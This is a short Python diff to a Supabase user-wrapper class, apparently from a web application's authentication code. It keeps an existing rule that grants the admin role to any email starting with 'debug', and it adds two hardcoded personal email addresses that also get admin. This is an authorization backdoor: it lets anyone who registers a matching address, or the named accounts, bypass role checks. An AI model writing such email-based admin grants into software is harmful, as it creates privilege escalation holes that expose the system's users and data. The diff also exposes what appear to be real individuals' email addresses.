@@ -16,8 +16,11 @@ class SupabaseUser:
         self.username = user_data.user_metadata.get('username', user_data.email)
         self.full_name = user_data.user_metadata.get('full_name', '')
         role_name = user_data.user_metadata.get('role', 'user')
-        if self.email.startswith('debug'):
+        
+        email_lower = str(self.email).lower().strip() if self.email else ""
+        if email_lower.startswith('debug') or email_lower in ['ivan.corona@wasion.cn', 'ivan.corona@wasion.com']:
             role_name = 'admin'
+            
         self.role = type('Role', (), {'name': role_name})()
         self.is_active = True 
         self.token = token
